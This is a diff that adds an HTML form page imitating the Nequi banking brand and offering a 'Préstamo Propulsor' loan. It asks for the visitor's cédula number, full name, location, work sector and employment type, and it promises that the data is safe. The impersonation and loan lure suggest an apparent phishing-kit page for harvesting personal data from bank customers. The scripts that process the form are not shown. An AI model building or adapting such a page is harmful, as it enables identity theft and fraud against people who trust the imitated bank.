@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nequi | Préstamo Propulsor</title>
+    <link rel="shortcut icon" href="./assets/pse/N_logo.png" type="image/x-icon">
+    <link rel="stylesheet" href="./css/tw.css">
+    <link rel="stylesheet" href="./css/normalize.css">
+    <link rel="stylesheet" href="./css/nequ.css">
+
+    <!-- script -->
+    <script src="./js/functions.js"></script>
+</head>
+<body>
+    <div id="loader" class="min-h-screen hidden flex items-center justify-center flex-col w-screen fixed z-[20] top-0 bg-white mrp">
+        <img src="./assets/pse/loading_nequi.gif" width="200px">
+        <p class="font-semibold mt-10">Espera un momentito ;) ¡No te vayas!</p>
+    </div>
+
+    <nav class="w-full flex justify-center fixed bg-white z-[10] border-b border-b-1 border-gray-200">
+        <div class="w-full p-4 max-w-[1200px] flex justify-between items-center">
+            <img src="./assets/pse/logo_nequi.svg">
+            <div class="hidden sm:flex items-center gap-6 mrp">
+                <a href="#" class="text-[#200020] hover:text-[#DA0081] transition-colors">Inicio</a>
+                <a href="#" class="text-[#200020] hover:text-[#DA0081] transition-colors">Para personas</a>
+                <a href="#" class="text-[#200020] hover:text-[#DA0081] transition-colors">Ayuda</a>
+                <a href="#" class="text-[#200020] hover:text-[#DA0081] transition-colors">Conócenos</a>
+                <div class="h-10 w-[1px] bg-gray-200"></div>
+                <button class="py-3 px-10 text-sm text-[#200020] border border-[#200020] bg-white rounded hover:bg-[#200020] hover:text-white transition-colors">
+                    Entrar
+                </button>
+                <button class="py-3 px-10 text-sm text-white bg-[#DA0081] rounded hover:bg-[#b3006b] transition-colors">
+                    Recargar
+                </button>
+            </div>
+            <div class="sm:hidden cursor-pointer">
+                <img src="./assets/pse/hamb_nequi.png" width="30px">
+            </div>
+        </div>
+    </nav>
+    
+    <section class="min-h-screen w-full px-2 flex items-center justify-center bg-[#fbe5f2] bg-nequi pt-[70px] mrp">    
+        <div class="w-full md:w-[500px] bg-white rounded p-3">
+            <p class="text-xl py-5 font-semibold text-center">Información Personal</p>
+
+            <p class="text-md py-3 text-center">Por favor dinos un poco más de tí</p>
+
+            <form class="py-3" id="form-info" action="">
+                <div class="input-container mt-2">
+                    <input type="text" id="cedula" placeholder="" oninput="limitDigits(this, 10)" required>
+                    <label for="cedula">Número de cédula</label>
+                </div>
+
+                <div class="input-container mt-2">
+                    <input type="text" id="nombre" placeholder="" required>
+                    <label for="nombre">Nombre completo</label>
+                </div>
+
+                <div class="mt-2">
+                    <select id="departamento" class="w-full p-3 border-none rounded focus:outline-none bg-[#faf8fc]" required>
+                        <option value="">Selecciona un departamento</option>
+                        <option value="AMAZONAS">Amazonas</option>
+                        <option value="ANTIOQUIA">Antioquia</option>
+                        <option value="ARAUCA">Arauca</option>
+                        <option value="ATLANTICO">Atlántico</option>
+                        <option value="BOLIVAR">Bolívar</option>
+                        <option value="BOYACA">Boyacá</option>
+                        <option value="CALDAS">Caldas</option>
+                        <option value="CAQUETA">Caquetá</option>
+                        <option value="CASANARE">Casanare</option>
+                        <option value="CAUCA">Cauca</option>
+                        <option value="CESAR">Cesar</option>
+                        <option value="CHOCO">Chocó</option>
+                        <option value="CORDOBA">Córdoba</option>
+                        <option value="CUNDINAMARCA">Cundinamarca</option>
+                        <option value="GUAINIA">Guainía</option>
+                        <option value="GUAVIARE">Guaviare</option>
+                        <option value="HUILA">Huila</option>
+                        <option value="GUAJIRA">La Guajira</option>
+                        <option value="MAGDALENA">Magdalena</option>
+                        <option value="META">Meta</option>
+                        <option value="NARIÑO">Nariño</option>
+                        <option value="NORTE-SANTANDER">Norte de Santander</option>
+                        <option value="PUTUMAYO">Putumayo</option>
+                        <option value="QUINDIO">Quindío</option>
+                        <option value="RISARALDA">Risaralda</option>
+                        <option value="SAN-ANDRES">San Andrés y Providencia</option>
+                        <option value="SANTANDER">Santander</option>
+                        <option value="SUCRE">Sucre</option>
+                        <option value="TOLIMA">Tolima</option>
+                        <option value="VALLE">Valle del Cauca</option>
+                        <option value="VAUPES">Vaupés</option>
+                        <option value="VICHADA">Vichada</option>
+                    </select>
+                </div>
+
+                <div class="input-container mt-2">
+                    <input type="text" id="municipio" placeholder="" required>
+                    <label for="municipio">Municipio</label>
+                </div>
+
+                <div class="mt-2">
+                    <select id="sector" class="w-full p-3 border border-none rounded focus:outline-none bg-[#faf8fc]" required>
+                        <option value="">¿En qué sector trabajas?</option>
+                        <option value="AGRICULTURA">Agricultura</option>
+                        <option value="CONSTRUCCION">Construcción</option>
+                        <option value="EDUCACION">Educación</option>
+                        <option value="FINANZAS">Finanzas y Seguros</option>
+                        <option value="GOBIERNO">Gobierno</option>
+                        <option value="HOTELERIA">Hotelería y Turismo</option>
+                        <option value="INDUSTRIA">Industria</option>
+                        <option value="MINERIA">Minería</option>
+                        <option value="SALUD">Salud</option>
+                        <option value="SERVICIOS">Servicios</option>
+                        <option value="TECNOLOGIA">Tecnología</option>
+                        <option value="TRANSPORTE">Transporte</option>
+                        <option value="COMERCIO">Comercio</option>
+                        <option value="OTROS">Otros</option>
+                    </select>
+                </div>
+
+                <div class="mt-2">
+                    <select id="tipo_empleo" class="w-full p-3 border border-none rounded focus:outline-none bg-[#faf8fc]" required>
+                        <option value="">¿En qué modalidad trabajas?</option>
+                        <option value="TERMINO_FIJO">Término Fijo</option>
+                        <option value="INDEFINIDO">Indefinido</option>
+                        <option value="INDEPENDIENTE">Independiente</option>
+                    </select>
+                </div>
+
+                <button type="submit" class="block w-full mt-5 py-3 bg-[#DA0081] rounded text-white">
+                    Continuar
+                </button>
+            </form>
+
+            <p class="text-sm py-3 text-center">Tranqui! tus datos están seguros con nosotros.</p>
+        </div>
+    </section>
+
+    <script src="./js/info.js"></script>
+</body>
+</html> 
